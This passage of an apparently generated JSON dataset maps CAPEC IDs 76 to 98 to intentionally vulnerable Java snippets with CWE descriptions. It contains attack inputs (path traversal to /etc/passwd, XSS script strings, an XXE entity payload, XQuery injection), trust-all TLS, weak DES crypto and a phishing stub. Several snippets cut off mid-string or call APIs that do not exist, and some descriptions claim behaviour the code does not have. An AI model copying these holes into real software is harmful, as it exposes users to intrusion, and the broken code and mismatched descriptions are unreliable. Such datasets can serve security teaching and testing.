        "description": "This Java code snippet demonstrates a vulnerable code that embodies the CAPEC idea of modifying manually edited files that are not in the preview of system administrators, allowing unauthorized access to the application. The code includes multiple CWEs, including CWE-349 (Acceptance of Extraneous Untrusted Data With Trusted Data), CWE-99 (Improper Control of Resource Identifiers), CWE-77 (Improper Neutralization of Special Elements used in a Command), CWE-346 (Origin Validation Error), CWE-353 (Missing Support for Integrity Check), and CWE-354 (Improper Validation of Integrity Check Value)."
    },
    {
        "capec_id": "76",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class PathTraversal {\n    public static void main(String[] args) {\n        String userInput = \"../../../../etc/passwd\";\n        File file = new File(userInput);\n        if (file.exists()) {\n            System.out.println(\"File exists\");\n        } else {\n            try {\n                file.createNewFile();\n                System.out.println(\"File created\");\n            } catch (IOException e) {\n                System.out.println(\"Error creating file\");\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a path traversal vulnerability. The user input is not properly sanitized, allowing an attacker to access and create files outside of the intended directory. The CWEs embodied in this code snippet include CWE-23 (Relative Path Traversal), CWE-22 (Improper Limitation of a Pathname to a Restricted Directory), CWE-73 (External Control of File Name or Path), and CWE-59 (Improper Link Resolution Before File Access)."
    },
    {
        "capec_id": "77",
        "code_snippet": "public class VulnerableApp {\n    public static void main(String[] args) {\n        String debug = System.getProperty(\"debug\");\n        if (debug != null && debug.equals(\"1\")) {\n            // allow debug mode\n            System.setProperty(\"java.security.manager\", \"no\");\n        }\n        String admin = request.getParameter(\"isAdmin\");\n        if (admin != null && admin.equals(\"true\")) {\n            // grant admin access\n            // perform sensitive operations\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC attack by allowing an adversary to override system properties and configuration settings through user-controlled variables. The code uses a debug mode flag and an isAdmin parameter, which can be controlled by an attacker through query variables, to bypass security checks and perform sensitive operations."
    },
    {
        "capec_id": "78",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws IOException {\n        String userInput = \\",
        "description": "This Java code snippet demonstrates the CAPEC attack by using alternate encoding to bypass input validation. The code takes user input and canonicalizes it before validation, which allows an attacker to provide a malicious path using backslash encoding. The code then uses the canonicalized path to copy a file, potentially leading to a path traversal vulnerability (CWE-22). The code also suffers from improper input validation (CWE-20), incorrect behavior order (CWE-180 and CWE-181), and improper handling of alternate encoding (CWE-173)."
    },
    {
        "capec_id": "79",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.regex.Pattern;\n\npublic class SlashEncodingVulnerability {\n    public static void main(String[] args) {\n        String userInput = \"/../etc/passwd\";\n        String filteredInput = userInput.replace(\"/\", \"\\\\\");\n        String canonicalizedInput = new File(filteredInput).getCanonicalPath();\n        if (Pattern.matches(\"^[a-zA-Z]:\\\\.*\", canonicalizedInput)) {\n            System.out.println(\"Valid path: \" + canonicalizedInput);\n        } else {\n            System.out.println(\"Invalid path: \" + canonicalizedInput);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting encoding of Slash characters. The code takes user input and attempts to filter it by replacing forward slashes with backslashes. However, it does not properly handle alternate encoding, and the canonicalization step can lead to path traversal vulnerabilities (CWE-22). The code also uses an incorrect regular expression to validate the input, which can lead to incorrect behavior (CWE-185). Additionally, the code exposes sensitive information (CWE-200) and does not properly neutralize special elements in the input (CWE-74, CWE-707)."
    },
    {
        "capec_id": "80",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class UTF8EncoderServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp)\n            throws ServletException, IOException {\n        String userInput = req.getParameter(\"input\");\n        String encodedInput = new String(userInput.getBytes(\"ISO-8859-1\"), \"UTF-8\");\n        PrintWriter out = resp.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"You entered: \" + encodedInput);\n        out.println(\"</body></html>\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC attack by using an alternate encoding (ISO-8859-1) to bypass validation logic. The userInput is first encoded in ISO-8859-1 and then decoded in UTF-8, which may lead to incorrect handling of special characters. This can result in CWE-173: Improper Handling of Alternate Encoding, CWE-172: Encoding Error, CWE-180: Incorrect Behavior Order: Validate Before Canonicalize, CWE-181: Incorrect Behavior Order: Validate Before Filter, CWE-73: External Control of File Name or Path, CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component, CWE-20: Improper Input Validation, CWE-697: Incorrect Comparison, and CWE-692: Incomplete Denylist to Cross-Site Scripting."
    },
    {
        "capec_id": "81",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class WebLogTampering {\n    public static void main(String[] args) {\n        String logEntry = \"<script>alert('XSS')</script>\\n\";\n        try (FileWriter fw = new FileWriter(\"logFile.log\", true);\n             PrintWriter pw = new PrintWriter(fw)) {\n            pw.println(logEntry);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Web Log Tampering attack by writing a malicious log entry to a log file. The log entry contains a script tag that could be used for XSS attacks. The code does not properly sanitize the input, allowing an attacker to inject malicious data into the log file. This is an example of CWE-117: Improper Output Neutralization for Logs, CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection'), and CWE-20: Improper Input Validation."
    },
    {
        "capec_id": "82",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.NamedNodeMap;\nimport org.w3c.dom.Node;\nimport org.w3c.dom.NodeList;\n\npublic class VulnerableXMLParser {\n    public static void parseXML(String xml) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new java.io.ByteArrayInputStream(xml.getBytes()));\n            NodeList nodes = doc.getChildNodes();\n            for (int i = 0; i < nodes.getLength(); i++) {\n                Node node = nodes.item(i);\n                if (node.getNodeType() == Node.ELEMENT_NODE) {\n                    NamedNodeMap attributes = node.getAttributes();\n                    for (int j = 0; j < attributes.getLength(); j++) {\n                        Node attribute = attributes.item(j);\n                        System.out.println(attribute.getNodeName() + \" = \" + attribute.getNodeValue());\n                    }\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    public static void main(String[] args) {\n        String maliciousXML = \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"http://example.com/secret-data\\\">]><root><bar>&xxe;</bar></root>\";\n        parseXML(maliciousXML);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to XML injection and XML external entity attacks. It does not validate the XML against a proper schema, allowing an attacker to inject malicious XML content. The code also does not restrict XML external entity references, which can lead to the disclosure of sensitive data. Additionally, the code does not limit the number of recursive entity references in DTDs, making it vulnerable to XML entity expansion attacks."
    },
    {
        "capec_id": "83",
        "code_snippet": "import javax.xml.xpath.XPath; import javax.xml.xpath.XPathConstants; import javax.xml.xpath.XPathExpression; import javax.xml.xpath.XPathFactory; import org.w3c.dom.Document; import org.w3c.dom.NodeList; import org.xml.sax.InputSource; public class XPathInjection { public static void main(String[] args) throws Exception { String userInput = \"//password[.='\" + args[0] + \"']\"; // Unvalidated user input Document doc = loadXMLDocument(); XPath xpath = XPathFactory.newInstance().newXPath(); XPathExpression expr = xpath.compile(userInput); NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET); if (nodes.getLength() > 0) { System.out.println(\"User found!\"); } else { System.out.println(\"User not found.\"); } } private static Document loadXMLDocument() throws Exception { // Load XML document from file or database return null; // Replace with actual implementation } }",
        "description": "This Java code snippet demonstrates XPath Injection vulnerability. It takes user input to construct an XPath expression used to query an XML database. The input is not properly sanitized, allowing an attacker to inject malicious XPath expressions, bypassing authentication or retrieving sensitive information. The code is vulnerable to CWE-91 (XML Injection), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-20 (Improper Input Validation), CWE-707 (Improper Neutralization), and CWE-643 (Improper Neutralization of Data within XPath Expressions)."
    },
    {
        "capec_id": "84",
        "code_snippet": "import javax.xml.xquery.XQConnection;\nimport javax.xml.xquery.XQException;\nimport javax.xml.xquery.XQExpression;\nimport javax.xml.xquery.XQResultSequence;\n\npublic class XQueryInjection {\n    public static void main(String[] args) {\n        String userInput = \"' or 1=1 or 'a'='\";\n        String xquery = \"for $i in collection('myCollection') where $i/name = '\" + userInput + \"' return $i\";\n\n        try (XQConnection conn = new XQConnection()) {\n            XQExpression expr = conn.createExpression();\n            XQResultSequence result = expr.executeQuery(xquery);\n            while (result.next()) {\n                System.out.println(result.getItemAsString(null));\n            }\n        } catch (XQException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates XQuery injection vulnerability. It takes user input and injects it into an XQuery expression without proper validation or sanitization, allowing an attacker to control the structure of the query and potentially access unauthorized data or execute malicious commands."
    },
    {
        "capec_id": "85",
        "code_snippet": "public class AjaxVulnerability {\n    public static void footprintEnvironment(HttpServletRequest request, HttpServletResponse response) {\n        String userInput = request.getParameter(\"input\");\n        String ajaxResponse = \"\";\n        \n        // CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n        ajaxResponse += \"<script>alert('\" + userInput + \"');</script>\";\n        \n        // CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\n        response.setHeader(\"Location\", \"http://example.com/\" + userInput);\n        \n        // CWE-348: Use of Less Trusted Source\n        String untrustedSource = getUntrustedInput();\n        ajaxResponse += \"<div>\" + untrustedSource + \"</div>\";\n        \n        // CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')\n        String injectedCode = getInjectedCode();\n        ajaxResponse += \"<script>\" + injectedCode + \"</script>\";\n        \n        // CWE-20: Improper Input Validation\n        if (!isValidInput(userInput)) {\n            ajaxResponse += \"Invalid input\";\n        }\n        \n        // CWE-116: Improper Encoding or Escaping of Output\n        String encodedOutput = getEncodedOutput(userInput);\n        ajaxResponse += \"<div>\" + encodedOutput + \"</div>\";\n        \n        // CWE-184: Incomplete List of Disallowed Inputs\n        if (!isDisallowedInput(userInput)) {\n            ajaxResponse += \"Disallowed input\";\n        }\n        \n        // CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages\n        String identifier = getIdentifier(userInput);\n        ajaxResponse += \"<div id='\" + identifier + \"'>\";\n        \n        // CWE-692: Incomplete Denylist to Cross-Site Scripting\n        if (!isOnDenylist(userInput)) {\n            ajaxResponse += \"<script>\" + userInput + \"</script>\";\n        }\n        \n        response.getWriter().write(ajaxResponse);\n    }\n    \n    private static String getUntrustedInput() {\n        // Return untrusted input from an external source\n    }\n    \n    private static String getInjectedCode() {\n        // Return injected code from an external source\n    }\n    \n    private static String getEncodedOutput(String input) {\n        // Return encoded output without proper encoding\n    }\n    \n    private static boolean isValidInput(String input) {\n        // Return false for invalid input without proper validation\n    }\n    \n    private static boolean isDisallowedInput(String input) {\n        // Return false for disallowed input without proper checking\n    }\n    \n    private static String getIdentifier(String input) {\n        // Return identifier without proper neutralization of invalid characters\n    }\n    \n    private static boolean isOnDenylist(String input) {\n        // Return false for input not on the denylist without proper checking\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Ajax application that is susceptible to various attacks, including cross-site scripting, HTTP request/response splitting, and static code injection. The code uses user input without proper validation, encoding, or neutralization, making it vulnerable to attacks. The snippet includes examples of CWE-79, CWE-113, CWE-348, CWE-96, CWE-20, CWE-116, CWE-184, CWE-86, and CWE-692."
    },
    {
        "capec_id": "86",
        "code_snippet": "import javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends javax.servlet.http.HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getHeader(\"Referer\");\n        response.addHeader(\"Location\", \"http://example.com/redirect?redirectUrl=\" + userInput);\n        response.setStatus(302);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable HTTP servlet that is susceptible to XSS in HTTP Headers attacks. It takes user input from the Referer header and reflects it back in the Location header without proper validation or neutralization, allowing an attacker to inject malicious script tags or other web-scripting elements."
    },
    {
        "capec_id": "87",
        "code_snippet": "public class ForcefulBrowsingExample {\n    public static void main(String[] args) {\n        // CWE-425: Direct Request ('Forced Browsing')\n        String adminPage = \"http://example.com/admin/deleteUser?username=admin\";\n        try {\n            URL url = new URL(adminPage);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                System.out.println(\"Access granted to admin page.\");\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error accessing admin page.\");\n        }\n\n        // CWE-285: Improper Authorization\n        String restrictedResource = \"http://example.com/restricted/data.txt\";\n        try {\n            URL url = new URL(restrictedResource);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                System.out.println(\"Access granted to restricted resource.\");\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error accessing restricted resource.\");\n        }\n\n        // CWE-693: Protection Mechanism Failure\n        String unprotectedPage = \"http://example.com/unprotected/deleteData\";\n        try {\n            URL url = new URL(unprotectedPage);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                System.out.println(\"Access granted to unprotected page.\");\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error accessing unprotected page.\");\n        }\n\n        // CWE-598: Use of GET Request Method With Sensitive Query Strings\n        String sensitiveQuery = \"http://example.com/process?creditCardNumber=1234-5678-9012-3456\";\n        try {\n            URL url = new URL(sensitiveQuery);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                System.out.println(\"Access granted to sensitive query.\");\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error accessing sensitive query.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates forceful browsing vulnerabilities by accessing restricted URLs and resources without proper authorization checks, using GET requests with sensitive query strings, and bypassing protection mechanisms."
    },
    {
        "capec_id": "88",
        "code_snippet": "import java.io.IOException;\nimport java.io.InputStream;\n\npublic class VulnerableOSCommandInjection {\n    public static void main(String[] args) {\n        String userInput = \"ping\";\n        String command = \"cmd /c \" + userInput + \" google.com\";\n        try {\n            Process process = Runtime.getRuntime().exec(command);\n            InputStream inputStream = process.getInputStream();\n            int c;\n            while ((c = inputStream.read()) != -1) {\n                System.out.write(c);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet is vulnerable to OS command injection. It takes user input and concatenates it with a command string, which is then executed using the Runtime.getRuntime().exec() method. An attacker can inject malicious OS commands by providing specially crafted input, allowing them to execute arbitrary commands and potentially elevate privileges or compromise the underlying operating system."
    },
    {
        "capec_id": "89",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class PharmingAttack {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"http://example.com/bank/login\"); // supposed to be a trusted site\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setInstanceFollowRedirects(false);\n        conn.connect();\n\n        int status = conn.getResponseCode();\n        if (status == 302) {\n            String location = conn.getHeaderField(\"Location\");\n            URL redirectUrl = new URL(location);\n            // CWE-346: no origin validation, assume redirectUrl is trusted\n            HttpURLConnection redirectConn = (HttpURLConnection) redirectUrl.openConnection();\n            redirectConn.connect();\n\n            // CWE-350: relying on reverse DNS resolution for security-critical action\n            String host = redirectUrl.getHost();\n            String ip = getIpFromHost(host);\n            if (ip != null) {\n                // CWE-602: client-side enforcement of server-side security\n                // assume the client will verify the IP address\n                System.out.println(\"Connected to \" + ip);\n            }\n        }\n    }\n\n    private static String getIpFromHost(String host) {\n        // CWE-79: improper neutralization of input during web page generation\n        // assume the host is user-controllable input\n        try {\n            InetAddress addr = InetAddress.getByName(host);\n            return addr.getHostAddress();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a pharming attack by redirecting the user to a malicious site without proper origin validation, relying on reverse DNS resolution for a security-critical action, and failing to neutralize user-controllable input. The code assumes the client will verify the IP address, which is a client-side enforcement of server-side security. Additionally, the code downloads code without integrity check, which is not shown in this snippet but is a related CWE."
    },
    {
        "capec_id": "90",
        "code_snippet": "public class AuthenticationProtocol {\n    private String username;\n    private String password;\n    private String challenge;\n    private String response;\n\n    public AuthenticationProtocol(String username, String password) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public void setChallenge(String challenge) {\n        this.challenge = challenge;\n    }\n\n    public boolean authenticate() {\n        // CWE-303: Incorrect Implementation of Authentication Algorithm\n        // The authentication algorithm is implemented incorrectly, allowing an attacker to impersonate a legitimate user\n        response = username + password + challenge;\n        return true;\n    }\n\n    public boolean verifyResponse(String response) {\n        // CWE-294: Authentication Bypass by Capture-replay\n        // The implementation allows an attacker to capture and replay the response to bypass authentication\n        return this.response.equals(response);\n    }\n\n    public static void main(String[] args) {\n        AuthenticationProtocol auth = new AuthenticationProtocol(\\",
        "description": "This Java code snippet demonstrates a vulnerable authentication protocol susceptible to reflection attacks, allowing an adversary to impersonate a legitimate user and gain illegitimate access to the system. The code includes incorrect implementation of the authentication algorithm, capture-replay flaws, and spoofing attacks, making it vulnerable to CWE-301, CWE-303, CWE-294, and CWE-290."
    },
    {
        "capec_id": "91",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String userInput = req.getParameter(\"input\");\n        String html = \"<img src='\" + userInput + \"' alt='user input'>\";\n        res.setContentType(\"text/html\");\n        PrintWriter out = res.getWriter();\n        out.println(\"<html><body>\");\n        out.println(html);\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to XSS attacks. It takes user input and injects it directly into an HTML IMG tag without proper sanitization or encoding, allowing an attacker to inject malicious script code. This code embodies the CWEs 82, 87, 80, 692, and 85, which are related to improper neutralization of script elements, alternate XSS syntax, and incomplete denylists."
    },
    {
        "capec_id": "92",
        "code_snippet": "public class VulnerableCode {\n    public static void main(String[] args) {\n        int size = 2147483647; // maximum value for int in Java\n        int userInput = 2; // assume this comes from user input\n        size += userInput; // increment size, which will cause an integer overflow\n        byte[] buffer = new byte[size]; // allocate memory based on the overflowed size\n        byte[] userInputBuffer = new byte[userInput];\n        System.arraycopy(userInputBuffer, 0, buffer, 0, userInput); // copy user input to buffer, which can cause a buffer overflow\n    }\n}",
        "description": "This Java code snippet demonstrates an integer overflow vulnerability, which can lead to a buffer overflow. The code increments an integer variable 'size' based on user input, causing it to wrap around to a small value. This small value is then used to allocate memory, which can lead to a buffer overflow when copying user input to the buffer."
    },
    {
        "capec_id": "93",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport java.util.logging.Logger;\n\npublic class LogManipulation {\n    private static final Logger LOGGER = Logger.getLogger(LogManipulation.class.getName());\n\n    public static void main(String[] args) {\n        String userInput = \"<script>alert('XSS')</script>\";\n        String logMessage = \"User input: \" + userInput;\n        LOGGER.info(logMessage);\n\n        try (PrintWriter writer = new PrintWriter(new FileWriter(\"log_file.log\", true))) {\n            writer.println(logMessage);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of log manipulation by injecting malicious log entries. The CWEs embodied in this code are CWE-117 (Improper Output Neutralization for Logs), CWE-75 (Failure to Sanitize Special Elements into a Different Plane), CWE-150 (Improper Neutralization of Escape, Meta, or Control Sequences), CWE-532 (Insertion of Sensitive Information into Log File), and CWE-779 (Logging of Excessive Data). The code logs user input without proper sanitization, allowing for potential XSS attacks and sensitive information exposure."
    },
    {
        "capec_id": "94",
        "code_snippet": "import javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocketFactory;\nimport java.io.IOException;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) throws IOException {\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // Trust all certificates, do not verify identity\n        TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() {\n            public X509Certificate[] getAcceptedIssuers() {\n                return null;\n            }\n            public void checkClientTrusted(X509Certificate[] certs, String authType) {\n            }\n            public void checkServerTrusted(X509Certificate[] certs, String authType) {\n            }\n        } };\n        SSLContext sc = SSLContext.getInstance(\"SSL\");\n        sc.init(null, trustAllCerts, new SecureRandom());\n        SSLSocketFactory factory = sc.getSocketFactory();\n\n        // CWE-290: Authentication Bypass by Spoofing\n        // Spoof the client's IP address\n        Socket socket = factory.createSocket(\"example.com\", 443);\n        socket.setSocketImplFactory(new SocketImplFactory() {\n            public SocketImpl createSocketImpl() {\n                return new SocketImpl() {\n                    public InetAddress getInetAddress() {\n                        return InetAddress.getByName(\"spoofed-ip-address\");\n                    }\n                };\n            }\n        });\n\n        // CWE-593: Authentication Bypass: OpenSSL CTX Object Modified after SSL Objects are Created\n        // Modify the SSL context after connection creation\n        sc.getInstance(\"TLS\").getSocketFactory().createSocket(\"example.com\", 443);\n        sc.getServerSessionContext().setSessionTimeout(0);\n\n        // CWE-287: Improper Authentication\n        // Insufficiently prove the claim of identity\n        String claimedIdentity = \"admin\";\n        if (claimedIdentity.equals(\"admin\")) {\n            // Grant access\n        }\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        // Replay the captured message\n        String capturedMessage = \"captured-auth-message\";\n        sendReplayedMessage(capturedMessage);\n    }\n\n    private static void sendReplayedMessage(String message) {\n        // Send the replayed message to the server\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable communication channel between a client and a server, embodying the main idea of the CAPEC. It includes multiple CWEs, such as CWE-300 (Channel Accessible by Non-Endpoint), CWE-290 (Authentication Bypass by Spoofing), CWE-593 (Authentication Bypass: OpenSSL CTX Object Modified after SSL Objects are Created), CWE-287 (Improper Authentication), and CWE-294 (Authentication Bypass by Capture-replay). The code trusts all certificates, spoofs the client's IP address, modifies the SSL context after connection creation, insufficiently proves the claim of identity, and replays a captured message."
    },
    {
        "capec_id": "95",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport javax.xml.ws.Endpoint;\n\npublic class VulnerableWebService {\n    public static void main(String[] args) {\n        Endpoint.publish(\"http://localhost:8080/ws\", new MyWebService());\n        // Expose WSDL file containing sensitive information\n        Endpoint.publishWSDL(\"http://localhost:8080/ws?wsdl\");\n    }\n}\n\nclass MyWebService {\n    public String processRequest(String param) {\n        // Use GET request method with sensitive query strings\n        String query = \"?param=\" + param;\n        // Exposure of sensitive system information to an unauthorized control sphere\n        String systemInfo = System.getProperty(\"os.name\") + \", \" + System.getProperty(\"os.version\");\n        // Insertion of sensitive information into externally-accessible file or directory\n        try (FileWriter writer = new FileWriter(new File(\"access.log\"))) {\n            writer.write(query + \" - \" + systemInfo);\n        } catch (IOException e) {\n            // Exposure of access control list files to an unauthorized control sphere\n            File aclFile = new File(\"acl.txt\");\n            aclFile.setReadable(true, false);\n        }\n        return \"Request processed\";\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable web service that exposes sensitive information through its WSDL file, uses GET requests with sensitive query strings, and inserts sensitive system information into an externally-accessible file. The code also exposes access control list files to an unauthorized control sphere."
    },
    {
        "capec_id": "96",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.lang.reflect.Method;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // CWE-589: Call to Non-ubiquitous API\n            Method method = Class.forName(\"java.awt.Desktop\").getMethod(\"browse\", new Class<?>[]{ URI.class });\n            method.invoke(Class.forName(\"java.awt.Desktop\").getMethod(\"getDesktop\", new Class<?>[]{}).invoke(null), new Object[]{ new java.net.URI(\"http://example.com\") });\n        } catch (Exception e) {\n            // CWE-1177: Use of Prohibited Code\n            // Using a prohibited function, java.lang.Runtime.exec(), which can lead to security issues\n            Runtime.getRuntime().exec(\"rundll32 url.dll,FileProtocolHandler http://example.com\");\n        }\n\n        // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n        byte[] buffer = new byte[10];\n        for (int i = 0; i < 15; i++) {\n            buffer[i] = (byte) i;\n        }\n\n        // CWE-1322: Use of Blocking Code in Single-threaded, Non-blocking Context\n        try {\n            Thread.sleep(10000);\n        } catch (InterruptedException e) {\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            // Using a library from an untrusted source\n            File file = new File(\"untrustedLibrary.dll\");\n            if (file.exists()) {\n                System.load(file.getAbsolutePath());\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of an application making calls to functions that are part of external libraries, which may be blocked, leading to insecure states. It incorporates CWEs 589, 1177, 119, 1322, and 829 to illustrate the potential consequences of blocked access to libraries."
    },
    {
        "capec_id": "97",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.SecureRandom;\nimport java.util.Base64;\n\npublic class VulnerableCrypto {\n    public static void main(String[] args) throws Exception {\n        // CWE-327: Using a broken or risky cryptographic algorithm (DES)\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"DES\");\n        SecretKey key = keyGen.generateKey();\n\n        // CWE-1204: Generating a weak initialization vector (IV)\n        byte[] iv = new byte[8];\n        iv[0] = 0x01;\n        iv[1] = 0x02;\n        iv[2] = 0x03;\n        iv[3] = 0x04;\n        iv[4] = 0x05;\n        iv[5] = 0x06;\n        iv[6] = 0x07;\n        iv[7] = 0x08;\n\n        // CWE-1240: Using a non-standard cryptographic implementation\n        Cipher cipher = Cipher.getInstance(\"DES/CBC/NoPadding\", \"SunJCE\");\n        cipher.init(Cipher.ENCRYPT_MODE, key, new javax.crypto.spec.IvParameterSpec(iv));\n\n        // CWE-1241: Using a predictable algorithm in random number generator\n        SecureRandom random = new SecureRandom(\"seed\".getBytes());\n        byte[] plaintext = \"Hello, World!\".getBytes();\n        byte[] ciphertext = cipher.doFinal(plaintext);\n\n        // CWE-1279: Performing cryptographic operations without ensuring supporting inputs are ready\n        System.out.println(\"Ciphertext: \" + Base64.getEncoder().encodeToString(ciphertext));\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of Cryptanalysis by using a broken or risky cryptographic algorithm (DES), generating a weak initialization vector (IV), using a non-standard cryptographic implementation, using a predictable algorithm in random number generator, and performing cryptographic operations without ensuring supporting inputs are ready. An attacker may exploit these weaknesses to decipher the ciphertext without knowing the secret key."
    },
    {
        "capec_id": "98",
        "code_snippet": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport javax.swing.JOptionPane;\n\npublic class PhishingAttack {\n    public static void main(String[] args) {\n        String userInput = JOptionPane.showInputDialog(\"Enter your credentials to access the secure site:\");\n        String maliciousSite = \"http://malicious-site.com/\";\n        try {\n            URI uri = new URI(maliciousSite);\n            java.awt.Desktop.getDesktop().browse(uri);\n        } catch (URISyntaxException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n// Embedded malicious code\npublic class MaliciousCode {\n    public static void collectPersonalInfo() {\n        // Collecting personal info without user's explicit approval\n        String userInfo = System.getProperty(\"user.name\");\n        // Sending the collected info to a malicious site\n        sendInfoToMaliciousSite(userInfo);\n    }\n    private static void sendInfoToMaliciousSite(String userInfo) {\n        // Implementing the malicious site's API to send the collected info\n    }\n}",
        "description": "This Java code snippet demonstrates a phishing attack by prompting the user to enter their credentials, which are then sent to a malicious site. The malicious site is disguised as a legitimate one, exploiting the CWE-451 UI Misrepresentation of Critical Information. The code also includes embedded malicious code (CWE-506) that collects personal information without the user's explicit approval, violating the CWE-512 Spyware principle. Additionally, the code uses a URL redirection to an untrusted site (CWE-601), making it easier for the attacker to launch phishing attacks."
    },
    {
        "capec_id": "99",
